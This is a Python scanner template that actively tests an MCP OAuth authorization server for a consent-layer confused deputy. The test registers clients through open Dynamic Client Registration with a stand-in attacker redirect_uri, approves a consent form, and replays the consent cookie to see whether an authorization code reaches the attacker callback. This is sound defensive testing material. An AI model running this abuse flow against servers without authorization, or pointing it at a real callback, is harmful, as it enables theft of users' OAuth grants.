#!/usr/bin/env python3
# @id: mcp-oauth-consent-dcr-abuse
# @name: MCP OAuth Consent-Layer Confused Deputy via Open Dynamic Client Registration
# @author: Bugb Research
# @severity: high
# @description: ACTIVE check. Drives an MCP OAuth authorization server through open Dynamic Client Registration and observes, by behaviour, whether an attacker-registered redirect_uri receives an authorization code with NO re-consent - the consent-layer confused deputy. Distinct from token-audience and issuer-binding: this tests the consent + registration layer, not the token. Also checks RFC 9207 `iss` return and `state` binding.
# @tags: mcp, ai, agent, oauth, oauth-conformance, dynamic-client-registration, dcr, consent, confused-deputy, redirect-uri, rfc9207, rfc7591, authorization-server, behavioural, active, intrusive, cwe-441, cwe-601
# @cwe: CWE-441, CWE-601
# @cvss: 8.2
# @target_kinds: http
# @oracles: property
# @references: https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization, https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration, https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations, https://www.rfc-editor.org/rfc/rfc7591.html, https://www.rfc-editor.org/rfc/rfc9207.html, https://www.rfc-editor.org/rfc/rfc6749.html#section-10.6, https://cwe.mitre.org/data/definitions/441.html, https://cwe.mitre.org/data/definitions/601.html
# @confidence: 90
# @version: 1.0.0
"""
ACTIVE / INTRUSIVE check - MCP OAuth *consent-layer* confused deputy.

WHY THIS IS A DIFFERENT CHECK FROM THE TOKEN ONES

Two templates in this pack already test the OAuth *token*:

  * mcp-token-audience-confusion   - does the resource server reject a token
                                     whose `aud` is not itself?
  * mcp-client-oauth-issuer-binding- does the client refuse a code whose
                                     RFC 9207 `iss` names a different issuer?

Both look at a token that already exists. This template looks one layer up, at
the machinery that MINTS the token: the authorization server's *consent +
registration* layer. A token can be perfectly audience-scoped and issuer-bound
and still have been handed to an attacker, because the authorization CODE that
produced it was delivered to an attacker-controlled `redirect_uri` that the
user never knowingly approved.

THE ATTACK CLASS THIS MODELS (synthetically)

A "confused deputy" at the consent screen, powered by open Dynamic Client
Registration. Three server-side mistakes compose into it, and each is
independently observable:

  (a) OPEN DCR. The `/register` endpoint (RFC 7591) accepts any client with no
      vetting of its `redirect_uri`. An attacker registers a client whose
      redirect_uri points at infrastructure they control.

  (b) SHARED STATIC client_id. The server hands the same client_id to every
      registrant (a common MCP shortcut - "one client_id for the gateway"),
      so an attacker-registered client is indistinguishable from the real one
      at the /authorize endpoint.

  (c) CONSENT REUSE WITHOUT RE-PROMPT. The user already granted consent for
      that client_id in a prior legitimate flow, so a consent cookie/session
      exists. When the attacker drives /authorize with the SAME client_id but
      their OWN redirect_uri, the server sees "consent already granted for this
      client_id" and skips the consent screen - delivering the authorization
      code to the attacker's redirect_uri with NO re-consent. RFC 6749 s.10.6
      warns about exactly this: consent must be bound to the redirect_uri, not
      just the client.

The user sees nothing. The code lands at the attacker's callback, the attacker
redeems it, and now holds a token the audience/issuer checks will happily
accept - because it is, by every downstream measure, a legitimate token. It was
the *consent decision* that was stolen.

THE ORACLE IS A PROPERTY OF AN OBSERVED RUN, NOT A FINGERPRINT

The template never reads a version string or a manifest. It speaks OAuth to the
server and observes what the server DOES, as a small differential that keeps
"reuses consent across redirect_uris" distinct from "has no consent layer at
all" (a different, weaker finding):

  Discover   GET /.well-known/oauth-authorization-server (and the openid
             variant). No registration_endpoint / authorization_endpoint that
             answers -> not an OAuth AS we can drive => skipped.

  DCR probe  POST the registration endpoint TWICE with a canary redirect_uri
             the AS was never told about
             (https://cxg-attacker-canary.example/cb).
               rejected (4xx invalid_redirect_uri) -> the AS VETS
                 redirect_uris at registration. The primary door is shut.
               accepted -> open DCR. Record the returned client_id from both
                 registrations; equal => shared-static client_id (mistake b).

  Baseline   NEGATIVE CONTROL for the consent layer. GET /authorize with a
             BENIGN, first-party redirect_uri and no cookie.
               immediate 302 with a `code` and no consent step -> the AS has
                 NO consent gate at all; there is nothing to be "reused"
                 without re-consent => skipped (a no-consent AS is a different
                 finding, not this one).
               a consent page (200, or a redirect to a login/consent URL) ->
                 a consent gate exists. Approve it (POST) to obtain a real
                 consent cookie and a code delivered to the benign redirect.
                 This also proves the flow WORKS, so a later refusal means
                 something.

  Abuse      With the consent cookie from Baseline, GET /authorize using the
             shared client_id but the ATTACKER canary redirect_uri and a fresh
             `state`.
               302 to the attacker redirect_uri carrying `code`, with NO
                 intervening consent page -> the consent decision was reused
                 across a redirect_uri the user never approved. Confused
                 deputy. => confirmed.
               a consent page is shown again (re-consent), OR the attacker
                 redirect_uri is rejected -> consent is bound to the
                 redirect_uri. => refuted.

  RFC 9207 / state (evidence, recorded on every /authorize redirect):
             is `iss` present on the authorization response, and is the
             `state` echoed unchanged? A confirmed finding that ALSO lacks
             `iss` is the sharpest signature (the client cannot even detect the
             mix-up); a refuted AS that returns `iss` and binds `state` shows
             the whole layer is intact.

VERDICT CONTRACT

  confirmed  open DCR accepted an unvetted attacker redirect_uri AND a code was
             delivered to it with no re-consent, on an AS that provably has a
             consent gate (Baseline showed one). Evidence carries every step's
             request/response, the shared-client_id observation, and the
             iss/state signals.
  refuted    the AS vetted the redirect_uri at registration, OR re-consented
             when the redirect_uri changed, OR rejected the attacker
             redirect_uri at /authorize - with the baseline flow proved live
             (a code WAS issued to the benign redirect, with `iss` and bound
             `state`), so the refutation proves the gate WORKS, not that it
             rejects blindly.
  skipped    a named missing precondition: no OAuth AS answered discovery; no
             registration/authorization endpoint; the AS has no consent gate at
             all (immediate code with no consent - see note above); or the
             baseline consent flow could not be completed, so the abuse step
             was never reachable.
  errored    the target could not be reached at all.

SAFETY

Nothing here touches a real identity provider or a real user. Every client_id,
redirect_uri, state and PKCE value is a synthetic `cxg-` decoy carrying a
per-run nonce; the attacker redirect_uri is a `.example` host that resolves
nowhere. No code is ever redeemed for a token and nothing is forwarded to any
third party - the template observes WHERE the authorization code is delivered
and WHETHER a consent screen intervened, and stops. It does drive an unfamiliar
authorization server, so get authorization before pointing it at software you
do not own.
"""

import json
import os
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timezone

METADATA = {
    "id": "mcp-oauth-consent-dcr-abuse",
    "name": "MCP OAuth Consent-Layer Confused Deputy via Open Dynamic Client Registration",
    "author": {"name": "Bugb Research", "email": "research@bugb.io"},
    "severity": "high",
    "description": (
        "ACTIVE check: drives an MCP OAuth authorization server through open Dynamic Client "
        "Registration and observes whether an attacker-registered redirect_uri receives an "
        "authorization code with no re-consent - the consent-layer confused deputy. Distinct from "
        "token-audience and issuer-binding: this tests the consent + registration layer, not the "
        "token. Also checks RFC 9207 `iss` return and `state` binding."
    ),
    "tags": ["mcp", "ai", "agent", "oauth", "oauth-conformance", "dynamic-client-registration",
             "dcr", "consent", "confused-deputy", "redirect-uri", "rfc9207", "rfc7591",
             "authorization-server", "behavioural", "active", "intrusive", "cwe-441", "cwe-601"],
    "language": "python",
    "active": True,
    "confidence": 90,
    "cwe": ["CWE-441", "CWE-601"],
    "references": [
        "https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization",
        "https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/client-registration",
        "https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations",
        "https://www.rfc-editor.org/rfc/rfc7591.html",
        "https://www.rfc-editor.org/rfc/rfc9207.html",
        "https://www.rfc-editor.org/rfc/rfc6749.html#section-10.6",
        "https://cwe.mitre.org/data/definitions/441.html",
        "https://cwe.mitre.org/data/definitions/601.html",
    ],
}

# Well-known discovery documents an OAuth 2.1 / MCP authorization server serves.
DISCOVERY_PATHS = [
    "/.well-known/oauth-authorization-server",
    "/.well-known/openid-configuration",
]

# Synthetic, per-run decoys. The attacker redirect_uri is a .example host that
# resolves nowhere; it is never contacted, only observed as a Location target.
NONCE = uuid.uuid4().hex[:12]
BENIGN_REDIRECT = "https://cxg-legit-client.example/cb"          # first-party, pre-approved
ATTACKER_REDIRECT = "https://cxg-attacker-canary.example/cb"     # unvetted, attacker-controlled
CANARY_STATE = "cxg-state-%s" % NONCE
CODE_CHALLENGE = "cxg0challenge0%s0000000000000000000000000000" % NONCE  # cosmetic PKCE

# A 4xx whose body names the redirect_uri as the reason is a vetting signal.
REDIRECT_REJECT_RE = re.compile(
    r"redirect[_ -]?uri|invalid[_ -]?redirect|unregistered|not[_ -]?allowed|"
    r"untrusted|invalid[_ -]?client[_ -]?metadata", re.I)
CONSENT_PAGE_RE = re.compile(
    r"consent|authorize|approve|grant\s+access|do\s+you\s+authorize|allow\s+this|"
    r"<form|sign[-\s]?in|log[-\s]?in", re.I)


# ---------------------------------------------------------------------------
# HTTP - redirects are NOT followed; a 302 Location is the observation itself.
# A tiny manual cookie jar carries the consent session between steps.
# ---------------------------------------------------------------------------

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # do not follow; let the 3xx surface to the caller


_OPENER = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=_ctx()))


def _request(method, url, timeout, body=None, headers=None, cookies=None):
    """Return (status, headers_lower_dict, body_text, set_cookies_dict).

    status is None only on a transport error; an HTTP code (302/400/401/...)
    comes back as its number because the code IS the observation."""
    h = dict(headers or {})
    if cookies:
        h["Cookie"] = "; ".join("%s=%s" % (k, v) for k, v in cookies.items())
    data = None
    if body is not None:
        if isinstance(body, dict):
            data = json.dumps(body).encode()
            h.setdefault("Content-Type", "application/json")
        elif isinstance(body, (bytes, bytearray)):
            data = bytes(body)
        else:
            data = str(body).encode()
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        r = _OPENER.open(req, timeout=timeout)
        status, hdrs, text = r.status, r.headers, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        status = e.code
        hdrs = e.headers
        try:
            text = e.read().decode("utf-8", "ignore")
        except Exception:
            text = ""
    except Exception:
        return None, {}, "", {}
    lower = {k.lower(): v for k, v in (hdrs or {}).items()}
    # collect every Set-Cookie (getlist preserves multiples)
    set_cookies = {}
    try:
        for sc in (hdrs.get_all("Set-Cookie") or []):
            name_val = sc.split(";", 1)[0].strip()
            if "=" in name_val:
                k, v = name_val.split("=", 1)
                set_cookies[k.strip()] = v.strip()
    except Exception:
        pass
    return status, lower, text, set_cookies


def _get(url, timeout, cookies=None):
    return _request("GET", url, timeout, headers={"Accept": "text/html,application/json"}, cookies=cookies)


def _parse_query(location):
    """Pull the query params from a redirect Location (absolute or relative)."""
    try:
        return dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(location).query))
    except Exception:
        return {}


def _authorize_url(endpoint, client_id, redirect_uri, state):
    q = urllib.parse.urlencode({
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "mcp:tools",
        "state": state,
        "code_challenge": CODE_CHALLENGE,
        "code_challenge_method": "S256",
    })
    return "%s%s%s" % (endpoint, "&" if "?" in endpoint else "?", q)


# ---------------------------------------------------------------------------
# Discovery.
# ---------------------------------------------------------------------------

def discover(base, timeout):
    """Return the AS metadata dict, or None if nothing OAuth-shaped answered."""
    for path in DISCOVERY_PATHS:
        status, _h, body, _c = _get(base + path, timeout)
        if status == 200 and body:
            try:
                meta = json.loads(body)
            except ValueError:
                continue
            if isinstance(meta, dict) and (meta.get("authorization_endpoint")
                                           or meta.get("registration_endpoint")):
                meta["_discovery_path"] = path
                return meta
    return None


# ---------------------------------------------------------------------------
# Steps.
# ---------------------------------------------------------------------------

def register_client(reg_endpoint, redirect_uri, timeout):
    """POST an RFC 7591 registration. Returns (accepted, client_id, status, excerpt)."""
    payload = {
        "client_name": "cxg-probe-%s" % NONCE,
        "redirect_uris": [redirect_uri],
        "grant_types": ["authorization_code"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "none",
        "cxg_synthetic": True,
    }
    status, _h, body, _c = _request("POST", reg_endpoint, timeout, body=payload,
                                    headers={"Accept": "application/json"})
    excerpt = (body or "")[:300]
    if status in (200, 201):
        try:
            obj = json.loads(body)
        except ValueError:
            obj = {}
        return True, obj.get("client_id"), status, excerpt
    return False, None, status, excerpt


def classify_authorize(status, headers, body):
    """Map one /authorize response onto the consent property.

    Returns (kind, location) where kind is one of:
      'code'    -> a redirect delivering an authorization code (no consent step)
      'consent' -> a consent/login page was shown (200 page, or a redirect to one)
      'reject'  -> the request was refused (4xx, or an error redirect)
      'other'   -> indeterminate
    """
    loc = headers.get("location", "")
    if status in (301, 302, 303, 307, 308):
        q = _parse_query(loc)
        if "code" in q:
            return "code", loc
        if "error" in q:
            return "reject", loc
        # a redirect to a consent/login page (no code, no error)
        if CONSENT_PAGE_RE.search(loc):
            return "consent", loc
        return "other", loc
    if status == 200:
        if CONSENT_PAGE_RE.search(body or ""):
            return "consent", loc
        return "other", loc
    if status in (400, 401, 403):
        return "reject", loc
    return "other", loc


def approve_consent(auth_endpoint, client_id, redirect_uri, state, cookies, timeout):
    """POST the consent-approval form. Returns (kind, location, set_cookies, status)."""
    form = urllib.parse.urlencode({
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "mcp:tools",
        "state": state,
        "code_challenge": CODE_CHALLENGE,
        "code_challenge_method": "S256",
        "approve": "true",
        "consent": "allow",
    })
    status, headers, body, set_cookies = _request(
        "POST", auth_endpoint, timeout, body=form,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Accept": "text/html,application/json"},
        cookies=cookies)
    kind, loc = classify_authorize(status, headers, body)
    return kind, loc, set_cookies, status


# ---------------------------------------------------------------------------
# Verdict.
# ---------------------------------------------------------------------------

def emit(status, detail, findings=None):
    meta = dict(METADATA)
    meta["status"] = status
    meta["detail"] = detail
    print(json.dumps({"findings": findings or [], "metadata": meta}, indent=2))


def scan(host, port, timeout=15, scheme="http"):
    base = "%s://%s:%d" % (scheme, host, port)
    steps = []  # ordered request/response evidence for every step

    meta = discover(base, timeout)
    if not meta:
        return "skipped", "no-oauth-authorization-server-answered-discovery(%s)" % base, []

    reg_endpoint = meta.get("registration_endpoint")
    auth_endpoint = meta.get("authorization_endpoint")
    iss_advertised = bool(meta.get("authorization_response_iss_parameter_supported"))
    steps.append({"step": "discover", "path": meta.get("_discovery_path"),
                  "registration_endpoint": reg_endpoint,
                  "authorization_endpoint": auth_endpoint,
                  "iss_param_advertised": iss_advertised})

    if not auth_endpoint:
        return "skipped", "no-authorization-endpoint-in-metadata(%s)" % base, []

    # --- DCR probe: two registrations with the attacker canary redirect_uri ---
    dcr_open = False
    shared_client_id = False
    attacker_client_id = None
    dcr_reject_signal = None
    if reg_endpoint:
        ok1, cid1, st1, ex1 = register_client(reg_endpoint, ATTACKER_REDIRECT, timeout)
        ok2, cid2, st2, ex2 = register_client(reg_endpoint, ATTACKER_REDIRECT, timeout)
        steps.append({"step": "dcr-1", "redirect_uri": ATTACKER_REDIRECT, "status": st1,
                      "accepted": ok1, "client_id": cid1, "body_excerpt": ex1})
        steps.append({"step": "dcr-2", "redirect_uri": ATTACKER_REDIRECT, "status": st2,
                      "accepted": ok2, "client_id": cid2, "body_excerpt": ex2})
        dcr_open = ok1 and cid1 is not None
        attacker_client_id = cid1
        if ok1 and ok2 and cid1 and cid2 and cid1 == cid2:
            shared_client_id = True
        if not ok1 and REDIRECT_REJECT_RE.search(ex1 or ""):
            dcr_reject_signal = "registration-rejected-unvetted-redirect_uri(status=%s)" % st1
    else:
        steps.append({"step": "dcr", "status": None, "accepted": False,
                      "note": "no registration_endpoint advertised"})

    # --- Baseline: is there a consent gate at all? establish a real cookie. ---
    # Register a benign client if DCR is open, else fall back to a shared/static id.
    benign_client_id = None
    if reg_endpoint:
        okb, cidb, stb, exb = register_client(reg_endpoint, BENIGN_REDIRECT, timeout)
        steps.append({"step": "dcr-benign", "redirect_uri": BENIGN_REDIRECT, "status": stb,
                      "accepted": okb, "client_id": cidb, "body_excerpt": exb})
        benign_client_id = cidb
    if not benign_client_id:
        benign_client_id = attacker_client_id or "cxg-shared-mcp-client"

    b_url = _authorize_url(auth_endpoint, benign_client_id, BENIGN_REDIRECT, CANARY_STATE)
    b_status, b_headers, b_body, b_cookies = _get(b_url, timeout)
    b_kind, b_loc = classify_authorize(b_status, b_headers, b_body)
    steps.append({"step": "baseline-authorize", "request": b_url, "status": b_status,
                  "kind": b_kind, "location": b_loc[:300],
                  "set_cookie": list(b_cookies.keys())})

    if b_kind == "code":
        # A code with no consent step and no cookie: there is no consent gate to
        # abuse. That is a weaker, different finding, not this one.
        q = _parse_query(b_loc)
        return ("skipped",
                "no-consent-gate(authorize issued a code with no consent step; nothing to reuse "
                "without re-consent) has_iss=%s | %s"
                % ("iss" in q, _surface(dcr_open, shared_client_id)), [])
    if b_kind not in ("consent",):
        return ("skipped",
                "baseline-consent-flow-not-drivable(kind=%s status=%s) - abuse step not reachable"
                % (b_kind, b_status), [])

    # Consent gate present. Approve it to get a real grant + cookie.
    cookies = dict(b_cookies)
    a_kind, a_loc, a_setcookie, a_status = approve_consent(
        auth_endpoint, benign_client_id, BENIGN_REDIRECT, CANARY_STATE, cookies, timeout)
    cookies.update(a_setcookie or {})
    baseline_q = _parse_query(a_loc)
    baseline_iss = baseline_q.get("iss")
    baseline_state_ok = baseline_q.get("state") == CANARY_STATE
    steps.append({"step": "baseline-consent-approve", "status": a_status, "kind": a_kind,
                  "location": a_loc[:300], "iss": baseline_iss,
                  "state_echoed": baseline_state_ok, "cookie_after": list(cookies.keys())})

    if a_kind != "code" or "code" not in baseline_q:
        return ("skipped",
                "baseline-consent-approval-did-not-issue-a-code(kind=%s status=%s) - the flow "
                "itself is not working, so the abuse step proves nothing" % (a_kind, a_status), [])

    # --- Abuse: same consent cookie, shared client_id, ATTACKER redirect_uri ---
    abuse_state = "cxg-abuse-%s" % NONCE
    abuse_url = _authorize_url(auth_endpoint, benign_client_id, ATTACKER_REDIRECT, abuse_state)
    ab_status, ab_headers, ab_body, _abc = _get(abuse_url, timeout, cookies=cookies)
    ab_kind, ab_loc = classify_authorize(ab_status, ab_headers, ab_body)
    abuse_q = _parse_query(ab_loc)
    abuse_iss = abuse_q.get("iss")
    abuse_state_ok = abuse_q.get("state") == abuse_state
    code_to_attacker = ab_kind == "code" and _same_redirect(ab_loc, ATTACKER_REDIRECT)
    steps.append({"step": "abuse-authorize", "request": abuse_url, "status": ab_status,
                  "kind": ab_kind, "location": ab_loc[:300],
                  "code_delivered_to_attacker_redirect": code_to_attacker,
                  "reconsent_prompted": ab_kind == "consent",
                  "iss": abuse_iss, "state_echoed": abuse_state_ok})

    surface = _surface(dcr_open, shared_client_id)
    surface += " baseline_iss=%s abuse_kind=%s abuse_iss=%s" % (
        baseline_iss, ab_kind, abuse_iss)

    # ---- Decide. ----
    if not code_to_attacker:
        if ab_kind == "consent":
            reason = "re-consent-prompted-for-new-redirect_uri"
        elif ab_kind == "reject":
            reason = "attacker-redirect_uri-rejected-at-authorize"
        elif dcr_reject_signal:
            reason = dcr_reject_signal
        else:
            reason = "no-code-delivered-to-attacker-redirect_uri(kind=%s)" % ab_kind
        detail = "%s | baseline issued a code to the benign redirect (iss=%s state_bound=%s) | %s" % (
            reason, baseline_iss, baseline_state_ok, surface)
        return "refuted", detail, []

    # Confirmed: a code reached the attacker redirect_uri with no re-consent, on
    # an AS that provably has a consent gate (baseline showed and approved one).
    signals = ["code-delivered-to-attacker-redirect_uri-without-re-consent"]
    if dcr_open:
        signals.append("open-dcr-accepted-unvetted-redirect_uri")
    if shared_client_id:
        signals.append("shared-static-client_id")
    if not abuse_iss:
        signals.append("no-rfc9207-iss-on-authorization-response")
    if not abuse_state_ok:
        signals.append("state-not-bound(echoed=%s)" % abuse_state_ok)

    finding = {
        "target": base,
        "template_id": METADATA["id"],
        "severity": METADATA["severity"],
        "confidence": METADATA["confidence"],
        "title": METADATA["name"],
        "description": (
            "The OAuth authorization server at %s delivered an authorization code to an "
            "attacker-controlled redirect_uri (%s) that the user never approved, reusing a consent "
            "decision the user granted for a first-party redirect_uri. The consent gate exists "
            "(the baseline flow showed a consent page and issued a code only after approval), yet "
            "when the same consent cookie was presented with the shared client_id and a NEW "
            "redirect_uri the server skipped re-consent and issued a code straight to the "
            "attacker's callback. %s%s This is the consent-layer confused deputy RFC 6749 s.10.6 "
            "warns about: consent must be bound to the redirect_uri, not just the client_id. "
            "Signals: %s."
            % (base, ATTACKER_REDIRECT,
               "Dynamic Client Registration is open and accepted an unvetted redirect_uri. "
               if dcr_open else "",
               "The server issues a shared static client_id to every registrant, so an "
               "attacker-registered client is indistinguishable at /authorize. " if shared_client_id else "",
               ", ".join(signals))),
        "evidence": {
            "request": ("discover -> register(attacker redirect_uri) x2 -> register(benign) -> "
                        "GET /authorize(benign) -> POST consent(benign) -> "
                        "GET /authorize(shared client_id, ATTACKER redirect_uri) with the consent cookie"),
            "response": json.dumps({
                "steps": steps,
                "confirmed_signals": signals,
                "attacker_redirect_uri": ATTACKER_REDIRECT,
            })[:1800],
            "matched_patterns": signals,
            "data": {
                "protocol": scheme,
                "port": port,
                "base": base,
                "authorization_endpoint": auth_endpoint,
                "registration_endpoint": reg_endpoint,
                "dcr_open": dcr_open,
                "shared_static_client_id": shared_client_id,
                "attacker_redirect_uri": ATTACKER_REDIRECT,
                "code_delivered_to_attacker_redirect": True,
                "reconsent_prompted": False,
                "rfc9207_iss_present": bool(abuse_iss),
                "state_bound": abuse_state_ok,
                "baseline_iss_present": bool(baseline_iss),
                "baseline_state_bound": baseline_state_ok,
            },
        },
        "cwe_ids": METADATA["cwe"],
        "tags": METADATA["tags"],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    detail = "consent-layer-confused-deputy(%s) | %s" % (",".join(signals), surface)
    return "confirmed", detail, [finding]


def _same_redirect(location, redirect_uri):
    """Does the redirect Location target the given redirect_uri (host+path)?"""
    try:
        a = urllib.parse.urlsplit(location)
        b = urllib.parse.urlsplit(redirect_uri)
        return (a.netloc, a.path) == (b.netloc, b.path)
    except Exception:
        return False


def _surface(dcr_open, shared_client_id):
    return "dcr_open=%s shared_client_id=%s" % (dcr_open, shared_client_id)


def main():
    sys.stderr.write(
        "[!] mcp-oauth-consent-dcr-abuse is an ACTIVE check: it registers a synthetic client via "
        "Dynamic Client Registration and drives OAuth authorization requests to observe whether an "
        "attacker-registered redirect_uri receives an authorization code without re-consent. No "
        "real credential is used and no code is redeemed. Make sure you are authorized to test this "
        "system.\n")
    sys.stderr.flush()

    if os.getenv("CERT_X_GEN_MODE") == "engine":
        raw = os.getenv("CERT_X_GEN_TARGET_HOST") or ""
        host = raw
        # An http target may arrive with a scheme/prefix; normalise it.
        m = re.match(r"^(https?)://([^/:]+)(?::(\d+))?", raw)
        scheme = os.getenv("CERT_X_GEN_TARGET_PROTOCOL") or "http"
        port_env = os.getenv("CERT_X_GEN_TARGET_PORT")
        if m:
            scheme = m.group(1)
            host = m.group(2)
            port = int(m.group(3)) if m.group(3) else int(port_env or (443 if scheme == "https" else 80))
        else:
            port = int(port_env or "80")
        if not host:
            emit("errored", "CERT_X_GEN_TARGET_HOST not set")
            sys.exit(0)
    else:
        if len(sys.argv) < 2:
            emit("errored", "Usage: mcp-oauth-consent-dcr-abuse.py <host> [port] [scheme]")
            sys.exit(0)
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
        scheme = sys.argv[3] if len(sys.argv) > 3 else "http"

    status, detail, findings = scan(host, port, scheme=scheme)
    emit(status, detail, findings)


if __name__ == "__main__":
    main()
